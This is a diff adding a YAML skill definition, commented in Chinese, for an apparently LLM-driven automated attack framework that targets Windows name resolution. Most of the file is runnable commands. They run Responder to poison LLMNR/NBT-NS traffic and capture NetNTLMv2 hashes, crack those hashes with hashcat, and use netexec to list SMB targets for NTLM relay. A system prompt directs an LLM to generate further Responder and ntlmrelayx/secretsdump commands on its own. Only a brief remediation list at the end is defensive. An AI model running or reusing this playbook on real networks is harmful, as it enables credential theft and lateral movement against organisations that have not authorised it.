@@ -1,0 +1,142 @@
+skill_id: responder_poisoning
+name: "Responder LLMNR/NBT-NS/mDNS Poisoning"
+category: network
+phase: foothold
+version: "1.0"
+
+principle: |
+  Windows 网络名称解析回退顺序：DNS → LLMNR → NBT-NS → mDNS。
+  当 DNS 解析失败时，客户端向局域网广播 LLMNR/NBT-NS 查询。
+  攻击者可监听这些广播并回复伪造响应，捕获 NetNTLMv2 哈希。
+  捕获的哈希可用于离线破解（hashcat -m 5600）或 NTLM Relay 攻击。
+
+match:
+  rules:
+    - variable_present: ["credential_store"]
+    - variable_present: ["lateral_results"]
+    - evidence_contains: ["LLMNR"]
+    - evidence_contains: ["NBT-NS"]
+    - evidence_contains: ["mDNS"]
+
+probes:
+  - id: check_lan_access
+    description: "检查是否可以访问局域网"
+    command: |
+      echo "[*] 局域网可达性检测"
+      if [ -n "$LHOST" ] && [ "$LHOST" != "127.0.0.1" ]; then
+        echo "LAN_ACCESS_AVAILABLE=true"
+      else
+        echo "LAN_ACCESS_AVAILABLE=false"
+      fi
+    timeout: 5
+    parse_rules:
+      - if_contains: ["LAN_ACCESS_AVAILABLE=true"]
+        set: { lan_access: true }
+      - if_contains: ["LAN_ACCESS_AVAILABLE=false"]
+        set: { lan_access: false }
+
+  - id: start_responder
+    description: "启动 Responder 捕获 NetNTLMv2 哈希"
+    depends_on: { lan_access: true }
+    command: |
+      echo "[*] 启动 Responder 侦听（30 秒快照）"
+      timeout 30 python3 -c "
+      import subprocess, sys
+      r = subprocess.run(['responder', '-I', 'eth0', '-A', '-v'], capture_output=True, text=True, timeout=25)
+      print(r.stdout[-3000:] if r.stdout else 'no output')
+      if 'NTLMv2' in r.stdout or 'Hash' in r.stdout:
+        print('RESPONDER_HASH_CAPTURED')
+      " 2>&1 || echo "[*] Responder 全模式尝试"
+      timeout 30 responder -I eth0 -wrfP 2>&1 | head -50 || true
+      echo "RESPONDER_CHECK_DONE"
+    timeout: 60
+    parse_rules:
+      - if_contains: ["NTLMv2", "Hash"]
+        set: { netntlmv2_captured: true, responder_output: true }
+
+exploit_paths:
+  - path_id: responder_netntlmv2_capture
+    name: "Responder NetNTLMv2 哈希捕获"
+    priority: 1
+    conditions:
+      lan_access: true
+    steps:
+      - id: capture_hashes
+        description: "运行 Responder 捕获 NetNTLMv2（60s 时间窗口）"
+        command: |
+          echo "[*] Responder NetNTLMv2 捕获（60s）"
+          mkdir -p /tmp/responder_logs
+          timeout 60 responder -I eth0 -A 2>&1 | tee /tmp/responder_logs/capture.txt | head -100 || true
+          echo "[*] 分析结果"
+          grep -i "ntlmv2\|hash\|challenge" /tmp/responder_logs/capture.txt 2>/dev/null | head -20 || echo "[-] 未捕获到哈希"
+          echo "RESPONDER_CAPTURE_DONE"
+        timeout: 90
+        success_criteria:
+          stdout_contains_any: ["NTLMv2", "Hash", "RESPONDER_CAPTURE_DONE"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "responder_hash"
+
+  - path_id: ntlm_relay_attack
+    name: "NTLM Relay 攻击（需要 Responder + ntlmrelayx 需要 SMB 目标）"
+    priority: 2
+    conditions:
+      lan_access: true
+    steps:
+      - id: setup_relay
+        description: "配置 NTLM Relay 到已知 SMB 目标"
+        command: |
+          echo "[*] NTLM Relay 准备"
+          echo "[注意] SMB 签名禁用检查"
+          netexec smb {TARGET_IP} --gen-relay-list /tmp/relay_targets.txt 2>&1 | head -20 || true
+          if [ -f /tmp/relay_targets.txt ] && [ -s /tmp/relay_targets.txt ]; then
+            echo "RELAY_TARGETS_FOUND"
+          else
+            echo "RELAY_NO_TARGETS"
+          fi
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["RELAY_TARGETS_FOUND"]
+        on_success: next_step
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "ntlm_relay"
+      - id: exec_ntlm_relay
+        description: "执行 NTLM Relay 攻击"
+        command: |
+          echo "[*] NTLM Relay 攻击执行"
+          echo "[注意] 需要手动在独立shell中启动: responder -I eth0 -A"
+          echo "RELAY_SETUP_DONE"
+        timeout: 5
+        success_criteria:
+          stdout_contains_any: ["RELAY_SETUP_DONE"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "ntlm_relay"
+
+  - path_id: llm_freeform
+    name: "LLM 自由推理（Responder/NTLM Relay）"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+
+llm:
+  max_rounds: 5
+  freeform_system_prompt: |
+    【漏洞范围】LLMNR/NBT-NS 投毒与 NTLM Relay
+    【严格限制】
+    - 只能尝试 Responder/NTLM Relay 相关攻击
+    - 需要局域网可达（LHOST 可用）
+    - responder -I eth0 -A 启动分析模式
+    - 捕获到的 NetNTLMv2 用 hashcat -m 5600 破解
+    - 每次只生成一条命令
+    【可用工具】responder, netexec, impacket-ntlmrelayx, impacket-secretsdump
+
+remediation: |
+  1. 禁用 LLMNR（组策略：关闭多播名称解析）
+  2. 禁用 NBT-NS（NetBIOS over TCP/IP）
+  3. 强制 SMB 签名（组策略：Microsoft 网络服务器: 对通信进行数字签名）
+  4. 部署 WPAD via DNS（非 LLMNR）
+  5. 启用 LDAP Channel Binding 和 LDAP Signing
